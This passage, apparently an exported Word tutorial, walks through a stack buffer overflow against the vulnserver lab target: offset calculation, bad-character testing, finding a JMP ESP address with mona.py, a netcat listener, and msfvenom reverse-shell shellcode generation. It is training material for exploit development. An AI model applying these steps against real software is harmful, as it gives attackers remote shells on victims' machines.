style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>#This can also be generated using mona.py in Immunity
Debugger but I will not show here the details.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>#Phase 3 of the python script help us to identify this
task.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Restart the <span class=SpellE>vulnserver</span> in
windows from the debugger (ctrl-<span class=SpellE>F2</span>) and run the python
script Phase 2 using the pattern we got. Once the server crash, check the value
in the registers (right side in immunity), specially the EIP value. In this
case it is <span class=SpellE><b>386F4337</b></span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Calculate the offset for this EIP value <span
class=GramE>using</span> <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:black;mso-color-alt:windowtext;background:#CCFFCC;mso-ansi-language:EN-AU'>/opt/<span
class=SpellE>metasploit</span>-framework/embedded/bin/ruby
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l
[length] -q <span class=SpellE><span class=GramE><b>386F4337</b></span></span></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:black;mso-color-alt:windowtext;background:#CCFFCC;mso-ansi-language:EN-AU'>In
<span class=SpellE>oother</span> kali: <span class=SpellE>msf-pattern_offset</span>
-l [length] -q <span class=SpellE>386F4337</span></span><span style='font-family:
"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";mso-ansi-language:
EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>=&gt; [*] Exact match at offset 2003<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Confirm the EIP can be manipulated by us:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Using the Part 3 of the python we can select the value
we want to <span class=GramE>left</span> in the EIP based on the identified
offset. Run the script and validate we have control of the EIP.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><span style='mso-spacerun:yes'>� </span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l0 level1 lfo18;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Identify
&quot;bad characters&quot; not accepted by the application.</span></b><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Part 4 of the script checks if the application has
some &quot;bad characters&quot;. <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>After running the exploit, observe the ESP value
(right pane) and the stack (right down) to validate all the &quot;<span
class=SpellE>badchars</span>&quot; sent were included. They should be observed
as a sequence (04030201 �). We can also observe the details in the down-left
side by right-clicking the ESP or stack and selecting follow in dump to see it
better. If there are some bad chars, then the <span class=SpellE>hexa</span>
value will not be showed in the sequence. We need to remove it from the <span
class=SpellE>badchars</span> string and run it again. In this way we can
identify and remove all bad chars. <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU;mso-no-proof:yes'><!--[if gte vml 1]><v:shapetype id="_x0000_t75"
 coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe"
 filled="f" stroked="f">
 <v:stroke joinstyle="miter"/>
 <v:formulas>
  <v:f eqn="if lineDrawn pixelLineWidth 0"/>
  <v:f eqn="sum @0 1 0"/>
  <v:f eqn="sum 0 0 @1"/>
  <v:f eqn="prod @2 1 2"/>
  <v:f eqn="prod @3 21600 pixelWidth"/>
  <v:f eqn="prod @3 21600 pixelHeight"/>
  <v:f eqn="sum @0 0 1"/>
  <v:f eqn="prod @6 1 2"/>
  <v:f eqn="prod @7 21600 pixelWidth"/>
  <v:f eqn="sum @8 21600 0"/>
  <v:f eqn="prod @7 21600 pixelHeight"/>
  <v:f eqn="sum @10 21600 0"/>
 </v:formulas>
 <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/>
 <o:lock v:ext="edit" aspectratio="t"/>
</v:shapetype><v:shape id="Picture_x0020_25" o:spid="_x0000_i1028" type="#_x0000_t75"
 style='width:992.7pt;height:464.4pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="BoF_files/image001.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1324 height=619
src="BoF_files/image002.jpg" v:shapes="Picture_x0020_25"><![endif]></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l8 level1 lfo20;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Detect the
right address to use in the <span class=GramE>EIP</span></span></b><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In this specific case, we observed that <span
class=GramE>the we</span> can left anything we want into the ESP. So we can
create a reverse shell string and replace the <span class=SpellE>badchar</span>
string by this value. This part will be completed in the next part.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Now that we have where to <span class=GramE>left</span>
the shellcode, we need to instruct the program to go to that place (ESP). So
now we need to send the instruction JMP ESP to the program. How? As we can
manipulate the EIP, we need to look where we can find a JMP ESP instruction and
point the EIP to that address.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>We will use mona.py in Immunity Debugger to complete
this part.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>To detect<span style='mso-spacerun:yes'>� </span>if
there are unprotected modules we can use to get an address with this operation
we need to use mona.py. It works with <span class=SpellE>Inmmunity</span>
Debugger and <span class=SpellE>WinDBG</span> (<a
href="https://github.com/corelan/mona">https://github.com/corelan/mona</a>).
Download and copy the file into Immunity Debugger\<span class=SpellE>PyCommands</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>For <span class=SpellE>Ghidra</span> <span
class=SpellE>x64dbg</span> is more complicated: <a
href="https://github.com/x64dbg/mona">https://github.com/x64dbg/mona</a><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>More details about mona: <a
href="https://www.corelan-training.com/">https://www.corelan-training.com/</a><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>To run mona, in Immunity Debugger run the command in
the textbox in the downside of the debugger. Just write:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>!mona modules<span style='mso-spacerun:yes'>��
</span>#In this case essfunc.dll is <span class=GramE>found</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'># Identify which modules have less protections active
from the process running. <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'># To know the op <span class=SpellE>codefor</span>
JUMP ESP we can use <span class=SpellE>msf-nasm_shell</span>. Run it and put
JMP ESP to identify the op <span class=GramE>code</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.5in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><span style='mso-spacerun:yes'>�</span><span
class=SpellE>msf-nasm_shell</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.5in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&gt;JMP ESP<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.5in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In other Kali is: /opt/<span class=SpellE>metasploit</span>-framework/embedded/bin/ruby
/opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.5in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>We got &quot;<span class=GramE>FFE4&quot;</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'># Now we need to look for the instruction JMP ESP
(&quot;\<span class=SpellE>xff</span>\<span class=SpellE>xe4</span>&quot;) in
the memory for any of these unprotected modules<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>!mona find -s &quot;\<span class=SpellE>xff</span>\<span
class=SpellE>xe4</span>&quot; -m &quot;essfunc.dll&quot; =&gt; -s<span
style='mso-spacerun:yes'>� </span>is the byte string to search for, -m<span
style='mso-spacerun:yes'>� </span>specifies the module to search in<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>#9 occurrences were found.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.5in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU;mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_26"
 o:spid="_x0000_i1027" type="#_x0000_t75" style='width:229.5pt;height:93.6pt;
 visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="BoF_files/image003.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=306 height=125
src="BoF_files/image004.jpg" v:shapes="Picture_x0020_26"><![endif]></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.5in;text-align:left;line-height:normal'><b><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>625011AF</span></b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'><span
style='mso-spacerun:yes'>�� </span>FFE4<span style='mso-spacerun:yes'>����
</span><span style='mso-spacerun:yes'>��������</span>JMP ESP<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In this case, we need to put this address (625011AF)
in the EIP so the program will go to it and run JMP ESP and then it will start
running the shellcode we have there!<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l9 level1 lfo22;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Generate and
run the <span class=GramE>shellcode</span></span></b><span style='font-family:
"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";mso-ansi-language:
EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In a terminal window in Linux run the listener to
receive the reverse shell: <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
class=SpellE><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>nc</span></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'> -<span class=SpellE>nvpl</span> 443<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Now <span class=GramE>let's</span> prepare the shell.
This shellcode should not contain bad chars (if we found any)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Using <span class=SpellE>msvenom</span> in Linux, we
can create it without the previously identified <span class=SpellE>badchars</span>.
At least \<span class=SpellE>x00</span> (null) should be included. -f specifies
the language (c, <span class=SpellE>py</span>, pl, �)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>The EXITFUNC=Thread is used to avoid the program to
terminate when we finish the shell. This will close only the thread used by the
shell.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:black;mso-color-alt:windowtext;background:#CCFFCC;mso-ansi-language:EN-AU'><span
style='mso-spacerun:yes'>�</span><span class=SpellE>msfvenom</span> -p windows/<span
class=SpellE>shell_reverse_tcp</span> LHOST=[IP KALI] LPORT=443 EXITFUNC=
thread -f <span class=SpellE>py</span> -e <span class=SpellE>x86</span>/<span
class=SpellE>shikata_ga_nai</span> -b &quot;\<span class=SpellE>x00</span>&quot;</span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Now we have all the pieces we need:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:117.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l11 level1 lfo24;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Offset (2003
in this case)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:117.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l11 level1 lfo24;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Address we
want to overwrite in the EIP (observe we need to include it in little <span
class=SpellE>indian</span> notation for <span class=SpellE>x86</span>: &quot;\<span
class=SpellE>xaf</span>\<span class=SpellE>x11</span>\<span class=SpellE>x50</span>\<span
class=SpellE>x62</span>&quot;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:117.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l11 level1 lfo24;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>the pattern
string (shellcode) we want to inject and run.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Run the python script Part 5 to inject the shellcode.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>We need to add some <span class=SpellE>nops</span>
before the shell as sometimes the execution of the shell modifies some parts
that could affect it. Sometimes 10 or 12 or 16 could be ok, but it is something
to play with if the shell did not start.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>To be sure the shell is loaded in the ESP, we can
create a breakpoint in the address where the JMP ESP is located (625011AF) so
the program will pause in that point. We can observe the ESP value and the
memory to validate the shellcode is there and it is complete.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU;mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_27"
 o:spid="_x0000_i1026" type="#_x0000_t75" style='width:437.4pt;height:367.2pt;
 visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="BoF_files/image005.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=583 height=490
src="BoF_files/image006.jpg" v:shapes="Picture_x0020_27"><![endif]></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
